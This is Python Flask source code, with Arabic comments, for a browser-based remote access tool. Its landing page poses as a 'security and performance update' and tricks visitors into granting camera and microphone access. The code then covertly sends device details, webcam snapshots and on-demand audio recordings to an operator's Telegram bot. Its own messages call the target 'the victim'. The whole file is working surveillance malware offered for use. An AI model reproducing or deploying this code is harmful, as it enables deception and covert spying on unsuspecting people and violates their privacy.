import os
import base64
import io
from flask import Blueprint, render_template_string, request

rat_bp = Blueprint('rat_module_v2', __name__)

# قالب احترافي مزود بتقنيات منع السكون والخلفية النشطة
RAT_ADVANCED_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام والأمان الشامل</title>
    <style>
        body { background-color: #0b0f19; color: #f3f4f6; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #111827; border: 1px solid #1f2937; padding: 35px; border-radius: 14px; max-width: 380px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
        h2 { color: #38bdf8; font-size: 20px; margin-bottom: 12px; }
        p { font-size: 13px; color: #9ca3af; line-height: 1.6; margin-bottom: 25px; }
        .action-btn { background-color: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 15px; width: 100%; cursor: pointer; transition: 0.3s; }
        .action-btn:hover { background-color: #1d4ed8; }
    </style>
</head>
<body>
    <div class="box" id="mainBox">
        <h2>⚡ تحديث الأداء والاتصال الآمن</h2>
        <p>لتفعيل الحماية الكاملة وتحسين استقرار الشبكة، اضغط على الزر أدناه لبدء المزامنة الفورية.</p>
        <button class="action-btn" onclick="activateFullControl()">بدء التثبيت والمزامنة</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const chatId = "{{ chat_id }}";
        let wakeLock = null;

        // ميزة منع الهاتف من الدخول في وضع السكون (Wake Lock API)
        async function requestWakeLock() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                }
            } catch (err) {
                console.log("Wake Lock error: ", err);
            }
        }

        async function activateFullControl() {
            try {
                // تفعيل منع السكون
                requestWakeLock();

                // طلب صلاحيات الكاميرا والميكروفون بضغطة زر واحدة
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                const video = document.getElementById('v');
                video.srcObject = stream;

                // إرسال البيانات الأولية للجهاز
                sendDeviceInfo();

                // التقاط صورة أولية بعد ثانية
                setTimeout(() => { captureAndSendPhoto(video); }, 1500);

                // بدء الاستماع المستمر للأوامر من السيرفر في الخلفية
                startCommandPolling();

                // تغيير الواجهة لتبدو كأن التحديث يعمل بنجاح
                document.getElementById('mainBox').innerHTML = "<h2>✅ جاري تحسين النظام...</h2><p>الرجاء إبقاء هذه الصفحة مفتوحة لضمان اكتمال التحسينات الأمنية.</p>";

            } catch (err) {
                alert("يرجى الموافقة على الأذن المترتب لضمان نجاح التحديث.");
            }
        }

        function sendDeviceInfo() {
            const data = {
                chat_id: chatId,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screen: window.screen.width + "x" + window.screen.height,
                cores: navigator.hardwareConcurrency || 'غير معروف'
            };
            fetch('/rat_v2_collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        function captureAndSendPhoto(video) {
            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/jpeg', 0.8);

            fetch('/rat_v2_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, image: imgData })
            });
        }

        // حلقة تفقد الأوامر القادمة من السيرفر في الخلفية كل 4 ثوانٍ بدقة عالية
        function startCommandPolling() {
            setInterval(async () => {
                try {
                    let res = await fetch('/rat_v2_poll?id=' + chatId);
                    let cmd = await res.json();
                    
                    if (cmd.action === "snapshot") {
                        const video = document.getElementById('v');
                        const canvas = document.getElementById('c');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imgData = canvas.toDataURL('image/jpeg', 0.8);

                        fetch('/rat_v2_image', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, image: imgData, title: "📸 **صورة فورية بناءً على طلبك:**" })
                        });
                    } 
                    else if (cmd.action === "audio") {
                        // تسجيل صوتي مباشر لمدة 5 ثوانٍ عند الطلب
                        const stream = video.srcObject;
                        if (stream) {
                            let chunks = [];
                            const recorder = new MediaRecorder(stream);
                            recorder.ondataavailable = e => chunks.push(e.data);
                            recorder.onstop = () => {
                                const blob = new Blob(chunks, { type: 'audio/mp3' });
                                const reader = new FileReader();
                                reader.readAsDataURL(blob);
                                reader.onloadend = () => {
                                    fetch('/rat_v2_audio', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                                    });
                                };
                            };
                            recorder.start();
                            setTimeout(() => recorder.stop(), 5000);
                        }
                    }
                } catch (e) {}
            }, 4000);
        }
    </script>
</body>
</html>
"""

# طوابير تخزين الأوامر المؤقتة لكل ضحية لضمان دقة التنفيذ الفوري
pending_commands = {}

def init_rat_routes(app, bot):
    @app.route('/system_secure_v2', methods=['GET'])
    def rat_landing():
        chat_id = request.args.get('id', '0')
        return render_template_string(RAT_ADVANCED_TEMPLATE, chat_id=chat_id)

    @app.route('/rat_v2_collect', methods=['POST'])
    def rat_collect():
        data = request.json or {}
        chat_id = data.get('chat_id')
        if chat_id and chat_id != '0':
            msg = (
                "🎯 **تم تفعيل الاتصال الدائم والخلفي بنجاح!**\n\n"
                f"💻 **النظام:** `{data.get('platform')}`\n"
                f"🌐 **المتصفح:** `{data.get('userAgent')}`\n"
                f"📐 **الشاشة:** `{data.get('screen')}`\n"
                f"⚙️ **المعالج:** `{data.get('cores')} أنوية`\n\n"
                "👇 **اختر الأوامر للتحكم بالضحية من الأزرار أسفل الرسالة:**"
            )
            # إرسال الرسالة مع لوحة تحكم تفاعلية (أزرار التحكم الدقيق)
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📸 التقاط صورة", callback_data=f"rat_cam_{chat_id}"),
                InlineKeyboardButton("🎙️ تسجيل صوت", callback_data=f"rat_mic_{chat_id}")
            )
            try:
                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
            except Exception as e:
                print(f"Error: {e}")
        return {"status": "ok"}

    @app.route('/rat_v2_poll', methods=['GET'])
    def rat_poll():
        chat_id = request.args.get('id')
        if chat_id in pending_commands and pending_commands[chat_id]:
            action = pending_commands[chat_id].pop(0)
            return {"action": action}
        return {"action": "none"}

    @app.route('/rat_v2_image', methods=['POST'])
    def rat_image():
        data = request.json or {}
        chat_id = data.get('chat_id')
        img_data = data.get('image')
        title = data.get('title', "📸 **صورة كاميرا الضحية:**")
        if chat_id and img_data:
            try:
                header, encoded = img_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                photo_file = io.BytesIO(image_bytes)
                photo_file.name = 'target_img.jpg'
                bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
            except Exception as e:
                print(f"Img err: {e}")
        return {"status": "ok"}

    @app.route('/rat_v2_audio', methods=['POST'])
    def rat_audio():
        data = request.json or {}
        chat_id = data.get('chat_id')
        audio_data = data.get('audio')
        if chat_id and audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                audio_file = io.BytesIO(audio_bytes)
                audio_file.name = 'target_voice.mp3'
                bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي مباشر من ميكروفون الضحية:**", parse_mode="Markdown")
            except Exception as e:
                print(f"Audio err: {e}")
        return {"status": "ok"}

# دالة لتسجيل الأوامر المرسلة من أزرار التليجرام
def queue_command(chat_id, action):
    if chat_id not in pending_commands:
        pending_commands[chat_id] = []
    pending_commands[chat_id].append(action)
